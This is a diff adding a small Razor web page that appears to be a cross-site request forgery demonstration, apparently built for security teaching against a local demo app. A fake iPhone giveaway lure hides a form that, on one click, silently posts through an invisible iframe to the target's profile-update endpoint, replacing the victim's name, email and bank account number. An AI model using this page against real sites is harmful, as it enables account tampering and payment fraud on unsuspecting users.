@@ -1,0 +1,25 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h1>Want to win an iPhone?</h1>
+
+<h2>Your brand new iPhone is just one click away!</h2>
+
+<iframe style="display: none;" name="evil-iframe"></iframe>
+
+<form id="evilform" action="http://web.local:57082/profile/update" method="post" target="evil-iframe">
+    <input type="hidden" name="FirstName" value="Marcin" />
+    <input type="hidden" name="LastName" value="Hoppe" />
+    <input type="hidden" name="Email" value="marcin.hoppe@acm.org" />
+    <input type="hidden" name="BankAccount" value="999999999999" />
+</form>
+
+<input type="button" value="Win an iPhone!" onclick="submitEvilForm()" />
+
+<script>
+    var submitEvilForm = function() {
+        $("#evilform").submit();
+        alert("Thanks for entering the contest! Good luck!");
+    };
+</script>
